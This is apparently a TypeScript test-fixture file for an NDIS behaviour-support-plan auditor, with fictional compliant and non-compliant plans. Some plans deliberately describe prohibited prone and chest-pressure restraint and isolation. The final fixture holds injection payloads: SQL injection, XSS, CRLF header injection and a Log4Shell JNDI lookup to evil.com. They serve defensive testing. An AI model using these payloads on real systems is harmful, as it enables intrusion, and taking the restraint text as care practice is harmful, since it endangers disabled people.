import type { BSPDocument, RestrictivePractice } from '../../types/index.ts';

/**
 * Authoritative Test Fixtures for NDIS BSP Quality & Safeguards Auditor
 * Governing Standards: NDIS Quality and Safeguards Commission & Restrictive Practices Rules 2018
 */

export const scenario1_CompliantBSP: BSPDocument = {
  id: 'bsp-scenario-1',
  clientId: 'cli-101',
  clientName: 'Jordan Miller',
  version: 'v2.1',
  status: 'Active',
  summary: 'Comprehensive Positive Behaviour Support Plan focusing on sensory regulation, proactive environmental predictability, and Functional Communication Training.',
  primaryBehaviorsOfConcern: [
    'Acoustic Overload Escalation (Covering ears, pacing rapidly, vocal distress when ambient noise >75dB)',
    'Demand Transition Resistance (Pushing desk chair firmly, sitting on floor refusing movement upon abrupt task changes)'
  ],
  proactiveStrategies: [
    'Visual schedule board with velcro token countdown updated 10 minutes prior to any activity transition',
    'Scheduled 10-minute sensory breaks every 45 minutes incorporating weighted lap pad and proprioceptive input',
    'Pre-briefing Jordan before entering crowded environments with "First-In / First-Seated" transport pass',
    'Noise-cancelling over-ear headphones permanently positioned on desk and carry bag'
  ],
  reactiveStrategies: [
    'Immediate low-arousal positioning: Step back 2 metres, maintain neutral body posture, avoid sustained eye contact',
    'Deliver 2-word calm verbal prompts ("Safe space", "Headphones on") alongside pictorial cue card',
    'Grant immediate access to designated quiet sensory break room without requiring verbal negotiation',
    'Allow minimum 20-minute post-peak recovery period before re-introducing environmental demands'
  ],
  restrictivePractices: [
    {
      id: 'rp-chem-01',
      clientId: 'cli-101',
      clientName: 'Jordan Miller',
      practiceType: 'Chemical',
      description: 'PRN Diazepam 2mg prescribed for severe panic during medical/dental invasive procedures where acute self-injury occurs.',
      status: 'Authorized',
      authorizationBody: 'VIC Senior Practitioner & Treating Psychiatrist Dr. Sarah Jenkins (AHPRA MED00018923)',
      authorizationReference: 'RPR-2025-VIC-88102',
      startDate: '2026-01-15',
      expiryDate: '2027-01-14',
      reductionPlanSummary: 'Graduated desensitization with social stories and VR exposure therapy to reduce PRN administration by 50% over 6 months; titration review every 90 days.',
      monthlyReportStatus: 'Submitted',
      lastReportedDate: '2026-08-01'
    },
    {
      id: 'rp-env-01',
      clientId: 'cli-101',
      clientName: 'Jordan Miller',
      practiceType: 'Environmental',
      description: 'Locked laundry cupboard storing chemical cleaning agents and hazardous detergents to prevent pica ingestion.',
      status: 'Authorized',
      authorizationBody: 'VIC Senior Practitioner',
      authorizationReference: 'RPR-2025-VIC-88103',
      startDate: '2026-02-01',
      expiryDate: '2027-01-31',
      reductionPlanSummary: 'Supervised kitchen/cleaning safety trials 3x weekly teaching non-toxic substance identification; lock fading criteria met when 10 consecutive trials pass.',
      monthlyReportStatus: 'Submitted',
      lastReportedDate: '2026-08-01'
    }
  ],
  reviewDate: '2026-12-01',
  authorName: 'Marcus Vance (Senior BSP, Advanced Practitioner NDIS PR-89021)',
  lastUpdated: '2026-08-01',
  participantProfile: {
    communicationMode: 'Multimodal: Combines spoken 2-3 word phrases with AAC tablet (Proloquo2Go) and visual PECS cards.',
    sensoryPreferences: [
      'Proprioceptive deep pressure (weighted vest / lap pad)',
      'Noise-cancelling headphones in public venues',
      'Low-lumen warm amber lighting preferred over fluorescent overheads'
    ],
    strengthsAndInterests: [
      'Exceptional digital tablet navigational and puzzle skills',
      'Passion for train networks, Lego engineering models, and spatial design',
      'Gentle and highly affectionate with therapy dogs and familiar support team'
    ],
    medicalHealthFactors: 'Diagnosed Autism Spectrum Disorder (Level 2), mild generalized anxiety; lactose intolerance; no seizure history.',
    decisionMakingPreferences: 'Visual 2-option forced choice boards with structured pictorial previews.'
  },
  functionalAssessment: {
    targetBehaviors: [
      {
        behavior: 'Acoustic Overload Escalation',
        operationalDefinition: 'Participant places hands over both ears, paces rapidly (>1.5 m/s), and produces high-pitched vocalisations when sudden noise exceeds 75dB.',
        severity: 4,
        frequency: '2-3 times per week during transport or hall transitions'
      },
      {
        behavior: 'Demand Transition Resistance',
        operationalDefinition: 'Participant pushes chair back firmly against wall or sits on floor refusing forward movement when a new task is introduced without visual warning.',
        severity: 3,
        frequency: '3-4 times per week at 10:30 AM and 14:30 PM'
      }
    ],
    settingEvents: [
      'Fatigue following disrupted nighttime sleep (<6 hours)',
      'Late morning arrival or unexpected traffic delays during community transit',
      'High ambient room temperature (>24°C) without air conditioning'
    ],
    immediateTriggers: [
      'Sudden loud noises (alarms, construction, lawnmowers, megaphone announcements)',
      'Abrupt demand transitions without a 5-minute visual timer notice',
      'Hallway congestion with more than 4 individuals in immediate 3-metre radius'
    ],
    maintainingConsequences: [
      'Temporary escape from high-demand sensory-rich environments',
      'Immediate reduction in auditory sensory input when removed to quiet zone'
    ],
    functionalHypothesis: 'When exposed to unpredictable auditory noise spikes or abrupt demand changes (especially when fatigued), Jordan engages in physical agitation and task avoidance primarily to ESCAPE sensory overload and regain somatic self-regulation.'
  },
  skillTeaching: {
    replacementBehaviors: [
      {
        target: 'Physical agitation during noise spikes',
        replacement: 'Independently reaching for noise-cancelling headphones or presenting "Quiet Space" AAC icon',
        teachingMethod: 'Functional Communication Training (FCT) paired with errorless roleplay in calm conditions twice weekly.'
      },
      {
        target: 'Chair pushing upon demand shift',
        replacement: 'Placing "Need 2-Min Break" token on visual schedule board',
        teachingMethod: 'Differential Reinforcement of Alternative Behaviour (DRA) with immediate break token compliance.'
      }
    ],
    functionalCommunicationTraining: 'Teach 3 core AAC symbols: "I Need Break", "Too Loud", and "Change Seat" with immediate 100% reinforcement schedule during acquisition phase.',
    reinforcementSchedule: 'Continuous reinforcement (FR1) for independent break/headphone requests; intermittent praise for calm transition completions.'
  },
  activeReactive: {
    earlyWarningSigns: [
      'Fidgeting with shirt hem and rapid knuckle tapping on tabletop',
      'Looking upwards towards ceiling lights repeatedly',
      'Breathing rate increases to >24 breaths per minute',
      'Vocal volume drops to soft repetitive hum'
    ],
    activeDeescalationStrategies: [
      'Immediately validate sensory state with calm whisper ("I see it is loud, let us get headphones")',
      'Offer weighted lap pad without demanding verbal acknowledgement',
      'Dim ambient room lights by 50% and turn off extraneous media/radios',
      'Provide single-card visual choice: "Stay here with headphones" OR "Walk to quiet room"'
    ],
    reactiveProtocols: [
      'Phase 1 (Agitation): Ensure 2-metre physical buffer. No demands placed.',
      'Phase 2 (Escalation): Guide peers to adjacent room calmly. Keep exit pathways clear.',
      'Phase 3 (Recovery): Offer glass of cool water and preferred sensory fidget. Do NOT debrief or question for at least 20 minutes post-baseline.'
    ],
    postIncidentDebrief: 'Conduct trauma-informed non-judgmental staff debrief within 24 hours. Log ABC observation and review trigger patterns with participant emotional check-in once calm.'
  },
  consultationRecords: [
    {
      consultationDate: '2026-07-20',
      stakeholderRole: 'Participant & Primary Nominee (Mother)',
      modality: 'In-person structured interview with visual AAC',
      consentDocumented: true,
      notes: 'Reviewed sensory accommodations and endorsed locked chemical cupboard safety plan.'
    },
    {
      consultationDate: '2026-07-22',
      stakeholderRole: 'Support Coordinator & Implementing Day Program Team',
      modality: 'Multi-disciplinary case conference',
      consentDocumented: true,
      notes: 'Agreed on FCT prompt hierarchy and visual countdown routines.'
    }
  ],
  governanceSchedule: {
    trainingCurriculum: 'PBS Tier 1 proactive accommodations, FCT prompt hierarchy, and de-escalation protocol training completed by all 6 support staff.',
    trainingCompetencyAssessed: true,
    apoSubmissionDate: '2026-08-05',
    annualReviewDueDate: '2027-08-01',
    leadPractitionerName: 'Marcus Vance',
    practitionerRegistrationNumber: 'PR-89021',
    seniorPractitionerAuthorized: true
  },
  complianceScore: 96
};

export const scenario2_ProhibitedPhysicalRestraintBSP: BSPDocument = {
  id: 'bsp-scenario-2',
  clientId: 'cli-102',
  clientName: 'Alex Mercer',
  version: 'v1.0',
  status: 'Draft',
  summary: 'Emergency response plan containing prohibited physical restraint methods.',
  primaryBehaviorsOfConcern: [
    'Severe physical aggression, kicking, and striking walls during frustration episodes.'
  ],
  proactiveStrategies: [
    'Staff vigilance and verbal warnings.'
  ],
  reactiveStrategies: [
    'Take Alex down to the floor in a prone position (face-down) with two staff members holding arms and legs firmly until calm.',
    'Apply chest pressure hold if kicking continues.'
  ],
  restrictivePractices: [
    {
      id: 'rp-phys-01',
      clientId: 'cli-102',
      clientName: 'Alex Mercer',
      practiceType: 'Physical',
      description: 'Prone floor restraint and supine basket hold during peak physical aggression.',
      status: 'Proposed',
      authorizationBody: 'None',
      authorizationReference: '',
      startDate: '2026-08-01',
      expiryDate: '2026-12-31',
      reductionPlanSummary: '',
      monthlyReportStatus: 'Due'
    }
  ],
  reviewDate: '2026-12-01',
  authorName: 'Unregistered Support Worker',
  lastUpdated: '2026-08-10',
  participantProfile: {
    communicationMode: '',
    sensoryPreferences: [],
    strengthsAndInterests: [],
    medicalHealthFactors: 'Asthma and respiratory concerns.',
    decisionMakingPreferences: ''
  },
  functionalAssessment: {
    targetBehaviors: [
      {
        behavior: 'Physical aggression',
        operationalDefinition: 'Acting out aggressively.',
        severity: 5,
        frequency: 'Daily'
      }
    ],
    settingEvents: [],
    immediateTriggers: [],
    maintainingConsequences: [],
    functionalHypothesis: 'Acts out to get his own way.'
  },
  skillTeaching: {
    replacementBehaviors: [],
    functionalCommunicationTraining: '',
    reinforcementSchedule: ''
  },
  activeReactive: {
    earlyWarningSigns: ['Looking angry'],
    activeDeescalationStrategies: ['Tell participant to calm down immediately'],
    reactiveProtocols: [
      'Physically hold Alex in prone position on ground until struggling stops.'
    ],
    postIncidentDebrief: 'Reprimand participant for breaking rules.'
  }
};

export const scenario3_IncompleteHypothesisBSP: BSPDocument = {
  id: 'bsp-scenario-3',
  clientId: 'cli-103',
  clientName: 'Liam O\'Connor',
  version: 'v1.1',
  status: 'Draft',
  summary: 'Plan with incomplete functional behavioral assessment and absence of proactive antecedent adjustments.',
  primaryBehaviorsOfConcern: [
    'Property damage and door slamming.'
  ],
  proactiveStrategies: [
    'Remind Liam of house rules every morning.'
  ],
  reactiveStrategies: [
    'Isolate Liam in bedroom for 30 minutes.'
  ],
  restrictivePractices: [],
  reviewDate: '2027-01-15',
  authorName: 'Provisional Practitioner',
  lastUpdated: '2026-08-05',
  participantProfile: {
    communicationMode: 'Verbal single words',
    sensoryPreferences: ['Enjoys listening to music'],
    strengthsAndInterests: ['Drawing'],
    medicalHealthFactors: 'None reported',
    decisionMakingPreferences: 'Asks for help'
  },
  functionalAssessment: {
    targetBehaviors: [
      {
        behavior: 'Door slamming',
        operationalDefinition: 'Slams bedroom door with force exceeding 80dB.',
        severity: 3,
        frequency: '3 times daily'
      }
    ],
    settingEvents: [],
    immediateTriggers: [],
    maintainingConsequences: [],
    functionalHypothesis: '' // Incomplete hypothesis (<20 chars)
  },
  skillTeaching: {
    replacementBehaviors: [],
    functionalCommunicationTraining: '',
    reinforcementSchedule: ''
  },
  activeReactive: {
    earlyWarningSigns: ['Pacing near hallway'],
    activeDeescalationStrategies: ['Offer tea'],
    reactiveProtocols: ['Step away from door'],
    postIncidentDebrief: 'Log in shift handoff'
  }
};

export const scenario4_MissingFadeOutScheduleBSP: BSPDocument = {
  id: 'bsp-scenario-4',
  clientId: 'cli-104',
  clientName: 'Chloe Zhang',
  version: 'v2.0',
  status: 'Submitted to NDIS',
  summary: 'Plan containing authorized restrictive practices but completely lacking a reduction and fade-out schedule.',
  primaryBehaviorsOfConcern: [
    'Uncontrolled ingestion of raw food and non-food items (Pica).'
  ],
  proactiveStrategies: [
    'Visual meal planner',
    'Sensory chew necklace available continuously',
    'Structured afternoon tea snack routine'
  ],
  reactiveStrategies: [
    'Redirect to chew necklace',
    'Offer safe alternative food item'
  ],
  restrictivePractices: [
    {
      id: 'rp-env-02',
      clientId: 'cli-104',
      clientName: 'Chloe Zhang',
      practiceType: 'Environmental',
      description: 'Keypad lock on kitchen refrigerator and pantry door 24/7 to prevent dangerous pica ingestion.',
      status: 'Authorized',
      authorizationBody: 'NSW Senior Practitioner',
      authorizationReference: 'RPR-2025-NSW-19042',
      startDate: '2026-01-01',
      expiryDate: '2026-12-31',
      reductionPlanSummary: '', // MISSING FADE PLAN
      monthlyReportStatus: 'Submitted'
    },
    {
      id: 'rp-mech-01',
      clientId: 'cli-104',
      clientName: 'Chloe Zhang',
      practiceType: 'Mechanical',
      description: 'Locked vehicle safety harness to prevent unbuckling on highway.',
      status: 'Authorized',
      authorizationBody: 'NSW Senior Practitioner',
      authorizationReference: 'RPR-2025-NSW-19043',
      startDate: '2026-01-01',
      expiryDate: '2026-12-31',
      reductionPlanSummary: '', // MISSING FADE PLAN
      monthlyReportStatus: 'Submitted'
    }
  ],
  reviewDate: '2026-12-31',
  authorName: 'Sarah Jenkins (Specialist Practitioner)',
  lastUpdated: '2026-08-01',
  participantProfile: {
    communicationMode: 'AAC Device (TouchChat)',
    sensoryPreferences: ['Oral motor chew tools', 'Vibrating sensory cushion'],
    strengthsAndInterests: ['Swimming', 'Puzzles'],
    medicalHealthFactors: 'History of pica ingestion; iron deficiency.',
    decisionMakingPreferences: 'Pictorial choices'
  },
  functionalAssessment: {
    targetBehaviors: [
      {
        behavior: 'Pica ingestion',
        operationalDefinition: 'Attempts to place inedible substances (paper, raw grains) into mouth.',
        severity: 4,
        frequency: '5-8 times daily'
      }
    ],
    settingEvents: ['Hunger between scheduled meals', 'Sensory oral seeking'],
    immediateTriggers: ['Unattended food prep areas', 'Loose paper on desks'],
    maintainingConsequences: ['Sensory oral stimulation and oral satiety'],
    functionalHypothesis: 'Chloe engages in pica ingestion primarily to satisfy sensory oral stimulation needs and when experiencing hunger between routine meal times.'
  },
  skillTeaching: {
    replacementBehaviors: [
      {
        target: 'Pica ingestion',
        replacement: 'Using oral chew tool or requesting "Snack" via TouchChat AAC',
        teachingMethod: 'FCT paired with immediate reinforcement of safe chew tool use.'
      }
    ],
    functionalCommunicationTraining: 'Teach "Snack" and "Chew Toy" AAC buttons.',
    reinforcementSchedule: 'FR1 during meal prep periods.'
  },
  activeReactive: {
    earlyWarningSigns: ['Scanning floor for items', 'Putting empty fingers in mouth'],
    activeDeescalationStrategies: ['Prompt with chew necklace', 'Offer safe crunchy snack (carrot sticks)'],
    reactiveProtocols: ['Gently prompt release of non-food item; do not use force.'],
    postIncidentDebrief: 'Check mouth and vital signs; record in pica log.'
  }
};

export const scenario5_FullAPOSubmissionBSP: BSPDocument = {
  ...scenario1_CompliantBSP,
  id: 'bsp-scenario-5',
  clientId: 'cli-105',
  clientName: 'Samira Khan',
  version: 'v3.0',
  status: 'Panel Review'
};

export const emptyBSP: BSPDocument = {
  id: 'bsp-empty',
  clientId: 'cli-999',
  clientName: '',
  version: '',
  status: 'Draft',
  summary: '',
  primaryBehaviorsOfConcern: [],
  proactiveStrategies: [],
  reactiveStrategies: [],
  restrictivePractices: [],
  reviewDate: '',
  authorName: '',
  lastUpdated: ''
};

export const unauthorizedRestraintBSP: BSPDocument = {
  ...scenario1_CompliantBSP,
  id: 'bsp-unauth-01',
  restrictivePractices: [
    {
      id: 'rp-unauth-01',
      clientId: 'cli-101',
      clientName: 'Jordan Miller',
      practiceType: 'Environmental',
      description: 'Locked bedroom window and external security mesh door to prevent absconding.',
      status: 'Active',
      authorizationBody: '',
      authorizationReference: '', // MISSING AUTHORIZATION REF
      startDate: '2026-01-01',
      expiryDate: '2026-12-31',
      reductionPlanSummary: 'Gradually unlock during daytime.',
      monthlyReportStatus: 'Due'
    }
  ]
};

export const maximumRestrictivePracticesBSP: BSPDocument = {
  ...scenario1_CompliantBSP,
  id: 'bsp-max-rp',
  restrictivePractices: [
    {
      id: 'rp-chem-all',
      clientId: 'cli-101',
      clientName: 'Jordan Miller',
      practiceType: 'Chemical',
      description: 'Daily Haloperidol 2mg and PRN Lorazepam 1mg.',
      status: 'Authorized',
      authorizationBody: 'VIC Senior Practitioner',
      authorizationReference: 'RPR-2025-VIC-90001',
      startDate: '2026-01-01',
      expiryDate: '2026-12-31',
      reductionPlanSummary: 'Step-down titration every 60 days.',
      monthlyReportStatus: 'Submitted'
    },
    {
      id: 'rp-mech-all',
      clientId: 'cli-101',
      clientName: 'Jordan Miller',
      practiceType: 'Mechanical',
      description: 'Soft padded arm splints to prevent severe ocular self-injury.',
      status: 'Authorized',
      authorizationBody: 'VIC Senior Practitioner',
      authorizationReference: 'RPR-2025-VIC-90002',
      startDate: '2026-01-01',
      expiryDate: '2026-12-31',
      reductionPlanSummary: 'Release 15 mins every hour.',
      monthlyReportStatus: 'Submitted'
    },
    {
      id: 'rp-phys-all',
      clientId: 'cli-101',
      clientName: 'Jordan Miller',
      practiceType: 'Physical',
      description: '2-person standing breakaway boundary escort strictly during imminent roadway danger.',
      status: 'Authorized',
      authorizationBody: 'VIC Senior Practitioner',
      authorizationReference: 'RPR-2025-VIC-90003',
      startDate: '2026-01-01',
      expiryDate: '2026-12-31',
      reductionPlanSummary: 'Road safety pedestrian training to eliminate escort hold.',
      monthlyReportStatus: 'Submitted'
    },
    {
      id: 'rp-env-all',
      clientId: 'cli-101',
      clientName: 'Jordan Miller',
      practiceType: 'Environmental',
      description: 'Locked vehicle doors while in transit.',
      status: 'Authorized',
      authorizationBody: 'VIC Senior Practitioner',
      authorizationReference: 'RPR-2025-VIC-90004',
      startDate: '2026-01-01',
      expiryDate: '2026-12-31',
      reductionPlanSummary: 'Seatbelt safety token economy.',
      monthlyReportStatus: 'Submitted'
    },
    {
      id: 'rp-sec-all',
      clientId: 'cli-101',
      clientName: 'Jordan Miller',
      practiceType: 'Seclusion',
      description: 'Emergency quiet room solitary de-escalation with constant observation for extreme acute weapon use.',
      status: 'Authorized',
      authorizationBody: 'VIC Senior Practitioner',
      authorizationReference: 'RPR-2025-VIC-90005',
      startDate: '2026-01-01',
      expiryDate: '2026-12-31',
      reductionPlanSummary: 'Low-arousal verbal calming with maximum 5-minute cap.',
      monthlyReportStatus: 'Submitted'
    }
  ]
};

export const mismatchedReplacementFbaBSP: BSPDocument = {
  ...scenario1_CompliantBSP,
  id: 'bsp-mismatched-fba',
  functionalAssessment: {
    targetBehaviors: [
      {
        behavior: 'Screaming and throwing objects',
        operationalDefinition: 'Screams loudly when asked to do academic tasks.',
        severity: 4,
        frequency: 'Daily'
      }
    ],
    settingEvents: ['Overstimulation'],
    immediateTriggers: ['Worksheet presented'],
    maintainingConsequences: ['Removed from desk to quiet area (Sensory / Task Escape)'],
    functionalHypothesis: 'Participant engages in screaming primarily to ESCAPE academic demands and noisy classroom settings.'
  },
  skillTeaching: {
    replacementBehaviors: [
      {
        target: 'Screaming',
        replacement: 'Earning gold star tokens to exchange for iPad game time (Tangible reward)',
        teachingMethod: 'Token economy for completing worksheets without screaming.'
      }
    ],
    functionalCommunicationTraining: 'Requesting iPad after tasks.',
    reinforcementSchedule: 'Token delivery upon task completion.'
  }
};

export const adversarialMaliciousBSP: BSPDocument = {
  id: "bsp-adv-'; DROP TABLE bsp_documents;--",
  clientId: '<script>alert("XSS")</script>',
  clientName: 'Test\u200B\u200C\u200D\uFEFFParticipant\u0000',
  version: 'v1.0\r\nLocation: http://evil.com',
  status: 'Draft',
  summary: 'A'.repeat(50000), // Extreme length stress test
  primaryBehaviorsOfConcern: [
    'Behaviour with \u202E RTL override text \u202C and \x00 null bytes'
  ],
  proactiveStrategies: [
    '"><img src=x onerror=alert(1)>'
  ],
  reactiveStrategies: [
    '${jndi:ldap://evil.com/a}'
  ],
  restrictivePractices: [
    {
      id: 'rp-adv-01',
      clientId: '<script>',
      clientName: 'Adversarial',
      practiceType: 'Physical',
      description: 'Prone restraint face down on floor with body pinning',
      status: 'Active',
      authorizationBody: 'Fake Auth Body',
      authorizationReference: 'INVALID-REF-FORMAT-000',
      startDate: '9999-99-99',
      expiryDate: '1970-01-01',
      reductionPlanSummary: '',
      monthlyReportStatus: 'Overdue'
    }
  ],
  reviewDate: 'invalid-date-format',
  authorName: 'Attacker \x1b[31mRed\x1b[0m',
  lastUpdated: '2026-08-16'
};
